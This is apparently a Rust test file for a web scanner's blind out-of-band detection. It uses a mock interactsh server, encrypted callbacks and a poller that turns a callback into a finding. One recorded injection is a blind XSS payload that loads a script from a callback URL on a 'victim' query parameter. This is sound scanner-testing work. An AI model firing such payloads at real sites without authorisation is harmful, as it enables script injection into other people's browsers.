//! End-to-end OOB test against a mock interactsh server (axum). Exercises the
//! full path: register → mint+record a payload → server fires an AES-256-CTR /
//! RSA-OAEP encrypted callback → poller decrypts, correlates, and emits a
//! `Verified` finding → deregister.

use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::Duration;

use axum::extract::{Query, State};
use axum::routing::{get, post};
use axum::{Json, Router};
use base64::Engine;
use base64::engine::general_purpose::STANDARD as B64;
use serde_json::{Value, json};
use tokio::sync::Mutex as TokioMutex;

use crate::oob::{InjectionRecord, OobConfig, OobSession, spawn_poller};

#[derive(Default)]
struct MockState {
    public_key_b64: Option<String>,
    correlation_id: Option<String>,
    /// Set by the test to make the next poll fire a callback for this nonce.
    pending_nonce: Option<String>,
    /// Bare host[:port] the client embeds in callback hosts.
    host: String,
    deregistered: bool,
}

type Shared = Arc<StdMutex<MockState>>;

async fn register(State(s): State<Shared>, Json(body): Json<Value>) -> Json<Value> {
    let mut st = s.lock().unwrap();
    st.public_key_b64 = body
        .get("public-key")
        .and_then(Value::as_str)
        .map(str::to_string);
    st.correlation_id = body
        .get("correlation-id")
        .and_then(Value::as_str)
        .map(str::to_string);
    Json(json!({ "message": "registration successful" }))
}

async fn deregister(State(s): State<Shared>, Json(_body): Json<Value>) -> Json<Value> {
    s.lock().unwrap().deregistered = true;
    Json(json!({ "message": "deregistration successful" }))
}

async fn poll(State(s): State<Shared>, Query(_q): Query<HashMap<String, String>>) -> Json<Value> {
    let (pubkey, corr, nonce, host) = {
        let mut st = s.lock().unwrap();
        (
            st.public_key_b64.clone(),
            st.correlation_id.clone(),
            st.pending_nonce.take(),
            st.host.clone(),
        )
    };
    let (Some(pubkey), Some(corr), Some(nonce)) = (pubkey, corr, nonce) else {
        return Json(json!({ "data": [], "aes_key": "" }));
    };

    let full_id = format!("{corr}{nonce}.{host}");
    let interaction = json!({
        "protocol": "http",
        "unique-id": format!("{corr}{nonce}"),
        "full-id": full_id,
        "remote-address": "203.0.113.9",
        "timestamp": "2026-06-12T00:00:00Z",
        "raw-request": "GET / HTTP/1.1\r\n\r\n",
    });
    let (data_b64, aes_key_b64) = server_encrypt(&pubkey, interaction.to_string().as_bytes());
    Json(json!({ "data": [data_b64], "aes_key": aes_key_b64 }))
}

/// Mirror the interactsh server: RSA-OAEP(SHA-256)-wrap a random AES key to the
/// client's public key, then AES-256-CTR encrypt the interaction as
/// `base64(IV ‖ ciphertext)`. Returns `(data, aes_key)`.
fn server_encrypt(public_key_pem_b64: &str, plaintext: &[u8]) -> (String, String) {
    use ctr::cipher::{KeyIvInit, StreamCipher};
    use rand::rngs::OsRng;
    use rsa::pkcs8::DecodePublicKey;
    use rsa::{Oaep, RsaPublicKey};
    use sha2_oaep::Sha256;
    type Aes256Ctr = ctr::Ctr128BE<aes::Aes256>;

    let pem = String::from_utf8(B64.decode(public_key_pem_b64).unwrap()).unwrap();
    let pubkey = RsaPublicKey::from_public_key_pem(&pem).unwrap();

    let aes_key = [0x11u8; 32];
    let mut rng = OsRng;
    let wrapped = pubkey
        .encrypt(&mut rng, Oaep::new::<Sha256>(), &aes_key)
        .unwrap();
    let aes_key_b64 = B64.encode(&wrapped);

    let iv = [3u8; 16];
    let mut buf = plaintext.to_vec();
    let mut cipher = Aes256Ctr::new_from_slices(&aes_key, &iv).unwrap();
    cipher.apply_keystream(&mut buf);
    let mut blob = iv.to_vec();
    blob.extend_from_slice(&buf);
    (B64.encode(&blob), aes_key_b64)
}

#[tokio::test]
async fn oob_end_to_end_register_poll_correlate_deregister() {
    let state: Shared = Arc::new(StdMutex::new(MockState::default()));
    let app = Router::new()
        .route("/register", post(register))
        .route("/poll", get(poll))
        .route("/deregister", post(deregister))
        .with_state(state.clone());
    let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
        .await
        .expect("bind mock interactsh");
    let addr = listener.local_addr().expect("addr");
    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });
    tokio::time::sleep(Duration::from_millis(30)).await;

    // The client derives host = "127.0.0.1:PORT" from this; the mock must use the
    // same host when building full-id so correlation matches.
    state.lock().unwrap().host = addr.to_string();

    let config = OobConfig {
        servers: vec![format!("http://{addr}")],
        secret: None,
        wait_secs: 1,
        timeout: 5,
        proxy: None,
        insecure: true,
    };
    let session = OobSession::start(&config)
        .await
        .expect("register with mock");

    // Arm a payload: mint a URL and record what we "injected" under its nonce.
    let (url, nonce) = session.mint_url();
    assert!(url.contains(&nonce));
    session.registry().record(
        nonce.clone(),
        InjectionRecord {
            target_url: "https://victim/?q=1".to_string(),
            param: "q".to_string(),
            location: "Query".to_string(),
            payload: format!("\"'><script src={url}></script>"),
            method: "GET".to_string(),
        },
    );
    // Make the next poll fire a callback for that nonce.
    state.lock().unwrap().pending_nonce = Some(nonce.clone());

    let results = Arc::new(TokioMutex::new(Vec::new()));
    let findings_count = Arc::new(AtomicUsize::new(0));
    let cancel = Arc::new(AtomicBool::new(false));
    let poller = spawn_poller(
        Arc::new(session),
        results.clone(),
        findings_count.clone(),
        cancel,
        /* silence */ true,
    );
    poller.finish(Duration::from_millis(400)).await;

    let found = results.lock().await;
    assert_eq!(
        found.len(),
        1,
        "expected exactly one correlated OOB finding"
    );
    let f = &found[0];
    assert_eq!(f.param, "q");
    assert_eq!(f.location, "Query");
    assert_eq!(f.severity, "High");
    assert_eq!(f.inject_type, "blind-oob-Query-http");
    assert!(f.payload.contains("script src="));
    assert!(f.evidence.contains("203.0.113.9"));
    assert_eq!(findings_count.load(Ordering::Relaxed), 1);
    assert!(
        state.lock().unwrap().deregistered,
        "session must deregister on finish"
    );
}

#[tokio::test]
async fn oob_session_start_fails_soft_when_no_server_registers() {
    // Unroutable / closed port → registration fails → start() errors (caller
    // turns this into a warning and continues with the static -b path).
    let config = OobConfig {
        servers: vec!["http://127.0.0.1:1".to_string()],
        secret: None,
        wait_secs: 1,
        timeout: 1,
        proxy: None,
        insecure: true,
    };
    assert!(OobSession::start(&config).await.is_err());
}
